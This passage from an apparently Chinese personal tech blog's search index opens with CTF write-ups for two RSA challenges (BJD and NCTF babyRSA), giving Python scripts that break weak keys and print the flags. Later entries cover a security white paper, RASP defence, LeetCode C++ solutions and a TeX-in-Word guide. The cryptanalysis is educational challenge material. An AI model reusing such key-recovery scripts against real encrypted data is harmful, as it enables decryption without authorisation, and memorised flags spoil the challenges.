13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line"><span class="string">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"><span class="string">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721  12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>前半部分可以得到（c,n,x已知）：<br>&emsp;&emsp;$c=m^{e}\ mod\ n$<br>对第二个print出来的值如果设为x，有：<br>&emsp;&emsp;$x=294^{e}\ mod\ n$  </li>
<li><p>后半部分有（c2,m2,n2已知）：<br>&emsp;&emsp;$c2=m2^{e}\ mod\ n2$  </p>
</li>
<li><p>解题首要目标自然是e，由于1中第二个表达式数值较小，本打算用sage求离散对数得到e但是跑不出来，所以用Python进行0，100000的遍历找这个e的值  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">x = <span class="number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="number">294</span>,e,n) == x:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
<p>得到e=52361  </p>
<ol>
<li>然后希望求得p,q的值以求d。但是想直接分解n的值太困难了。这里n和n2已知，且它们有最大公因数q，可直接求得，所以解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span></span><br><span class="line">n = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">n2 = <span class="number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line">e = <span class="number">52361</span></span><br><span class="line">q = gcd(n,n2)</span><br><span class="line">p = n // q</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<p><code>BJD&#123;p_is_common_divisor&#125;</code>  </p>
<h2 id="NCTF2019-babyRSA"><a href="#NCTF2019-babyRSA" class="headerlink" title="[NCTF2019]babyRSA"></a>[NCTF2019]babyRSA</h2><h3 id="题目代码-1"><a href="#题目代码-1" class="headerlink" title="题目代码"></a>题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextPrime</span>(<span class="params">n</span>):</span></span><br><span class="line">    n += <span class="number">2</span> <span class="keyword">if</span> n &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(n):</span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = nextPrime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line"><span class="comment"># c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br></pre></td></tr></table></figure>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p><a href="https://blog.csdn.net/weixin_44110537/article/details/107214109">参考1</a><br><a href="https://blog.csdn.net/weixin_44017838/article/details/105116339">参考2</a>  </p>
<ol>
<li>e,d已知，先确定$ed-1$的位数。  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">x = gmpy2.log2(e*d-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
<p>结果为：2063.2545176257354  </p>
<ol>
<li>p的位数为1024，q在p的附近所以大致也是1024位。$\phi(n)$的位数约为2048，而$ed-1$大概是2063~2064位，所以$ed-1=1+x\phi(n)$中的x的位数为15~16。  </li>
<li>在$2^{15}$~$2^{16}$减遍历x，找到可以被x整除的$ed-1$。那么有$\phi(n)=\frac{ed-1}{x}$  </li>
<li>找到这个$\phi(n)$，因此p和q大小相近，可以取$\phi(n)$平方根，在其附近的素数取为p，得到p值就很容易找到q，只要它们都是素数，将它们相乘得到n，随即得到明文。  </li>
<li>解题代码：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*d - <span class="number">1</span>) % x == <span class="number">0</span>:</span><br><span class="line">        phn = (e*d - <span class="number">1</span>) // x</span><br><span class="line">        p = nextprime(iroot(phn,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">        q = phn // (p-<span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q) <span class="keyword">and</span> isPrime(p):</span><br><span class="line">            <span class="built_in">print</span>(p, q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># p = 143193611591752210918770476402384783351740028841763223236102885221839966637073188462808195974548579833368313904083095786906479416347681923731100260359652426441593107755892485944809419189348311956308456459523437459969713060653432909873986596042482699670451716296743727525586437248462432327423361080811225076497</span></span><br><span class="line"><span class="comment"># q = 143193611591752210918770476402384783351740028841763223236102885221839966637073188462808195974548579833368313904083095786906479416347681923731100260359652426441593107755892485944809419189348311956308456459523437459969713060653432909873986596042482699670451716296743727525586437248462432327423361080811225075839</span></span><br><span class="line">n = p*q</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>NCTF&#123;70u2_nn47h_14_v3ry_gOO0000000d&#125;</code></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414?fr=aladdin">https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414?fr=aladdin</a><br>[2] FlappyPig.CTF特训营<br>[3] <a href="https://www.freebuf.com/articles/database/170814.html?replytocom=249214">https://www.freebuf.com/articles/database/170814.html?replytocom=249214</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>读中兴的网络安全愿景白皮书</title>
    <url>/2021/07/04/%E5%85%B3%E4%BA%8E%E4%B8%AD%E5%85%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%BF%E6%99%AF%E7%99%BD%E7%9A%AE%E4%B9%A6/</url>
    <content><![CDATA[<ul>
<li>定义</li>
</ul>
<p>关于对内生安全的定义，与我们课题组的思想基本一致。我们都希望构建一个具备自适应、自学习、自生长能力的，可以自主进行安全调控的，一个安全与功能高度融合的系统。</p>
<ul>
<li>愿景</li>
</ul>
<p><img src="/2021/07/04/%E5%85%B3%E4%BA%8E%E4%B8%AD%E5%85%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%BF%E6%99%AF%E7%99%BD%E7%9A%AE%E4%B9%A6/image-20210704155523983.png" alt="image-20210704155523983" style="zoom:80%;"></p>
<p>其畅想，未来网络架构将走向一体化，从其未来网络架构图中，其实并未体现这个一体化。关于图 2 的能力体系，是挺有意思的：以统一身份与信任体系为基础，建立边界、网元、全网三道防线。</p>
<font face="楷体" color="grey">其在畅想中提出，网络内生安全作为广义网络的基础能力而存在，类似人的免疫体系。这个跟定义中提到的概念也是相关的，不过我们认为免疫的概念难以与传统的异常检测做区分，人体的免疫系统中 B 细胞、T 细胞等等的联合作用在本质上仍是异常检测，理论上唯一的不同可能是后期的调整与处理。人体的免疫体系与神经控制体系的关联是紧密的，面向以任务为导向的系统应用时，我们可能更倾向于对神经控制系统的映射与应用。</font>

<ul>
<li>可能的发展</li>
</ul>
<p><img src="/2021/07/04/%E5%85%B3%E4%BA%8E%E4%B8%AD%E5%85%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%BF%E6%99%AF%E7%99%BD%E7%9A%AE%E4%B9%A6/image-20210704160236775.png" alt="image-20210704160236775" style="zoom:80%;"></p>
<p>对于 AI 和系统模型建立，我们课题组在先前的论文中已经有所提及，在未来我认为度量方法会是一个很有前景的研究方向。</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>科研</tag>
        <tag>想法</tag>
      </tags>
  </entry>
  <entry>
    <title>RASP技术</title>
    <url>/2021/07/04/RASP%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="1-什么是-RASP"><a href="#1-什么是-RASP" class="headerlink" title="1 什么是 RASP"></a>1 什么是 RASP</h2><p>Runtime application self-protection，运行时应用自我保护技术，与应用程序融为一体，实时监测和阻断攻击，注入到被保护应用的服务中提供函数级别的实时防护，可以在不更新策略以及不升级被保护应用代码的情况下检测/防护未知漏洞。具备自我保护功能，不需要人为干涉。</p>
<h2 id="2-RASP-的原理"><a href="#2-RASP-的原理" class="headerlink" title="2 RASP 的原理"></a>2 RASP 的原理</h2><p>在 Java 技术栈下，RASP 引擎以 javaagent 的形式实现，并运行在 JVM 之上。在应⽤服务器启动的时候，RASP 引擎借助 JVM 自身提供的 instrumentation 技术，通过替换字节码的方式对关键类方法进行挂钩，结合上下文、参数污染、语义引擎等方式检测攻击。比如：数据库操作、文件读写、命令执行等，当服务器发生攻击，就会触发这些 HOOK 点，然后 RASP agent 就可以获取到函数的参数（文件名、要执行的命令等）</p>
<p>RASP 的技术原理与 APM是⼀样的，只是挂钩的函数要少很多。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://rasp.baidu.com/#section-intro">开源应用运行时自我保护解决方案 - OpenRASP - 百度安全 (baidu.com)</a></li>
<li><a href="https://paper.seebug.org/330/">Rasp 技术介绍与实现 (seebug.org)</a></li>
<li><a href="https://www.freebuf.com/articles/web/197823.html">https://www.freebuf.com/articles/web/197823.html</a></li>
<li><a href="https://rasp.baidu.com/doc/hacking/architect/java.html">Java 版本 - OpenRASP 官方文档 - 开源自适应安全产品 (baidu.com)</a></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指Offer打卡</title>
    <url>/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/</url>
    <content><![CDATA[<h2 id="Group1"><a href="#Group1" class="headerlink" title="Group1"></a>Group1</h2><h3 id="03-数组中重复的数字"><a href="#03-数组中重复的数字" class="headerlink" title="03. 数组中重复的数字"></a>03. 数组中重复的数字</h3><ol>
<li>先遍历数组，若有超过区间 [0, n-1] 的数值，就直接返回 -1</li>
<li>再遍历一次数组，如果当前位置的数值与下标不一样。<ul>
<li>且数值对应的那个下标与当前位置的值不同，就交换它们的位置。</li>
<li>若一样，则说明找到了重复元素了</li>
</ul>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x : nums) </span><br><span class="line">            <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != nums[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] != nums[nums[i]]) <span class="built_in">swap</span>(nums[i], nums[nums[i]]);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="04-二维数组中的查找"><a href="#04-二维数组中的查找" class="headerlink" title="04. 二维数组中的查找"></a>04. 二维数组中的查找</h3><p><a href="https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof">https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof</a></p>
<p>这里可以看出，第 0 行的最后一列是该行最大，该列最小。所以从矩阵的右上角开始遍历。</p>
<ul>
<li>正好等于目标值直接返回 true</li>
<li>大于目标值，说明目标一定在更小的列</li>
<li>小于目标值，则一定在更大的行</li>
</ul>
<p><img src="/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/image-20210705225035681.png" alt="image-20210705225035681" style="zoom:80%;"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">findNumberIn2DArray</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (matrix.<span class="built_in">size</span>() == <span class="number">0</span> || matrix[<span class="number">0</span>].<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 检查边界</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = matrix[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; matrix.<span class="built_in">size</span>() &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (matrix[i][j] &gt; target) --j;</span><br><span class="line">            <span class="keyword">else</span> ++i; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="05-替换空格"><a href="#05-替换空格" class="headerlink" title="05. 替换空格"></a>05. 替换空格</h3><p><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof">https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof</a></p>
<ul>
<li>很简单，开一个新字符串，再遍历源字符串，遇到空格就加 <code>%20</code>，否则就加原字符</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i : s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="string">&#x27; &#x27;</span>) </span><br><span class="line">                ans += <span class="string">&quot;%20&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Group2"><a href="#Group2" class="headerlink" title="Group2"></a>Group2</h2>]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法与数据结构</tag>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title>在Word中插入伪码</title>
    <url>/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/</url>
    <content><![CDATA[<h2 id="1-texlive-下载安装"><a href="#1-texlive-下载安装" class="headerlink" title="1 texlive 下载安装"></a>1 texlive 下载安装</h2><ol>
<li>下载 texlive2021 <a href="https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/">https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/</a></li>
</ol>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705190359766.png" alt="image-20210705190359766" style="zoom:80%;"></p>
<ol>
<li>用资源管理器打开，这样就会装载到 DVD 驱动器</li>
</ol>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705190808453.png" alt="image-20210705190808453"></p>
<ol>
<li>以管理员方式运行 install-tl-windows.bat，等待安装完毕</li>
</ol>
<h2 id="2-texsword-下载安装"><a href="#2-texsword-下载安装" class="headerlink" title="2 texsword 下载安装"></a>2 texsword 下载安装</h2><ol>
<li><p>下载地址 <a href="https://sourceforge.net/projects/texsword/，解压后将其中的四个文件都复制到">https://sourceforge.net/projects/texsword/，解压后将其中的四个文件都复制到</a> <code>C:\Users\自己的用户名\AppData\Roaming\Microsoft\Word\STARTUP</code> 中</p>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705193329388.png" alt="image-20210705193329388"></p>
</li>
<li><p>重启 Word，在加载项中可以找到 texsword 相关选项</p>
</li>
<li><p>点击 TEX，在源码区输入伪码（TeX 语法），然后运行即可</p>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705193441934.png" alt="image-20210705193441934"></p>
</li>
<li><p>效果如下</p>
</li>
</ol>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705193618881.png" alt="image-20210705193618881" style="zoom:80%;"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>注意一定要安装 texlive，texsword 才可正常使用</p>
<ol>
<li><p><a href="https://blog.csdn.net/aiwei169/article/details/81431363">https://blog.csdn.net/aiwei169/article/details/81431363</a></p>
</li>
<li><p><a href="https://www.neusncp.com/user/blog?id=151">https://www.neusncp.com/user/blog?id=151</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>tex</tag>
      </tags>
  </entry>
</search>
